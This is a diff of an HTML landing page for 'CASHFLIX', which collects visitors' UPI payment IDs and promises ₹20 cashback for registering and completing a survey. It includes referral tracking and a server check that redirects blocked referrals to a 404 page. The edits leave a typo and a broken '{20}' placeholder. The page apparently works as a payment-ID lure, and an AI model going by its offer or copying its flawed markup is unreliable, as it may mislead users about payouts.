@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+                                                                          <!DOCTYPE html>
 <html lang="en">
 <head>
 <meta charset="UTF-8">
@@ -24,7 +24,7 @@ body { font-family:'Nunito',sans-serif; background:#f7f1e3; min-height:100vh; di
 .cashback-box::after { content:''; position:absolute; right:-20px; top:-20px; width:120px; height:120px; background:rgba(245,230,200,0.08); border-radius:50%; }
 .cashback-label { font-family:'Poppins',sans-serif; font-size:11px; font-weight:700; color:#f5e6c8; letter-spacing:1.5px; text-transform:uppercase; margin-bottom:6px; }
 .cashback-amount { font-family:'Poppins',sans-serif; font-size:48px; font-weight:800; color:#fdf6e3; line-height:1; margin-bottom:12px; }
-.cashback-amount span { font-size:28px; }
+.cashback-amount > span:first-child { font-size:28px; }
 .badges { display:flex; gap:12px; flex-wrap:wrap; }
 .badge { display:flex; align-items:center; gap:4px; font-size:12px; font-weight:700; color:#f5e6c8; }
 .badge::before { content:'✓'; font-weight:900; color:#e8c97a; }
@@ -52,9 +52,13 @@ body { font-family:'Nunito',sans-serif; background:#f7f1e3; min-height:100vh; di
 .verify-box { margin-top:12px; display:flex; flex-direction:column; align-items:center; gap:8px; min-height:65px; }
 .verify-note { font-size:12px; color:#9d9d9d; font-weight:700; }
 @media (max-width:380px) { .toast { white-space:normal; } }
+
 </style>
+<style>.cf-wait .cf-amt{visibility:hidden}</style>
+<script>document.documentElement.className+=" cf-wait";</script>
 </head>
 <body>
+
 
 <div id="formCard" class="main-card">
   <div class="header">
@@ -76,16 +80,16 @@ body { font-family:'Nunito',sans-serif; background:#f7f1e3; min-height:100vh; di
     </div>
   </div>
   <div class="form-label"><i class="fa-solid fa-credit-card"></i> UPI ID</div>
-  <input type="text" class="phone-input" id="phoneInput" placeholder="Enter your UPI ID (name@bank)" maxlength="50" inputmode="email" autocapitalize="none" autocomplete="off" spellcheck="false">
+  <input type="text" class="phone-input" id="phoneInput" placeholder="Enter Your UPI ID (name@bank)" maxlength="50" inputmode="email" autocapitalize="none" autocomplete="off" spellcheck="false">
   <div class="error-msg" id="errorMsg"><i class="fa-solid fa-triangle-exclamation"></i><span>Please enter a valid UPI ID (like name@bank)!</span></div>
   <div id="verifyBox" class="verify-box"><div id="turnstileBox"></div><div class="verify-note">Verify you are human to continue</div></div>
   <button class="submit-btn hidden" id="submitBtn" onclick="handleSubmit()">SUBMIT</button>
   <div class="divider"></div>
   <div class="steps-title"><i class="fa-solid fa-clock"></i> How to complete?</div>
-  <div class="step"><div class="step-num">1</div><div class="step-text">Enter Your UPI ID &amp; Submit.</div></div>
+  <div class="step"><div class="step-num">1</div><div class="step-text">Enter You UPI ID&amp; Submit.</div></div>
   <div class="step"><div class="step-num">2</div><div class="step-text">Register &amp; Complete First Survey.</div></div>
-  <div class="step"><div class="step-num">3</div><div class="step-text">Get <span class="highlight">₹<span class="cf-amt">20</span></span> Cashback in Your Upi.</div></div>
-  <div class="powered">Powered by <span>CASHFLIX ⚡</span></div>
+  <div class="step"><div class="step-num">3</div><div class="step-text">Get {20} Cashback in Your UPI ID.</div></div>
+  <div class="powered">Powered by CASHFLIX ⚡</div>
 </div>
 
 <div id="pausedCard" class="hidden pause-card">
@@ -133,7 +137,7 @@ async function checkOfferStatus() {
 checkOfferStatus();
 
 let REF_CODE = ''; try { REF_CODE = (new URLSearchParams(location.search).get('source') || new URLSearchParams(location.search).get('ref') || localStorage.getItem('cf_ref') || '').slice(0, 12); if (REF_CODE) localStorage.setItem('cf_ref', REF_CODE); } catch (e) {}
-try { fetch(SERVER + '/upi/refer-info?code=' + encodeURIComponent(REF_CODE || '') + '&key=' + encodeURIComponent(OFFER_KEY)).then(function (r) { return r.json(); }).then(function (j) { if (j && (j.found === false || j.blocked)) { location.replace('/404.html'); return; } if (j && j.valid && j.amount >= 0) document.querySelectorAll('.cf-amt').forEach(function (e) { e.textContent = j.amount; }); }).catch(function () {}); } catch (e) {}
+try { fetch(SERVER + '/upi/refer-info?code=' + encodeURIComponent(REF_CODE || '') + '&key=' + encodeURIComponent(OFFER_KEY)).then(function (r) { return r.json(); }).then(function (j) { if (j && (j.found === false || j.blocked)) { location.replace('/404.html'); return; } if (j && j.valid && j.amount >= 0) document.querySelectorAll('.cf-amt').forEach(function (e) { e.textContent = j.amount; }); }).catch(function () {}).then(function () { document.documentElement.classList.remove('cf-wait'); }); setTimeout(function () { document.documentElement.classList.remove('cf-wait'); }, 15000); } catch (e) { document.documentElement.classList.remove('cf-wait'); }
 async function getLink(clickId) {
   try {
     const r = await fetch(SERVER + '/go', {
@@ -237,6 +241,6 @@ document.getElementById('phoneInput').addEventListener('input', function() {
   document.getElementById('errorMsg').style.display = 'none';
 });
 </script>
+
 </body>
-                                                                              </html>
-                                                                              
+</html>
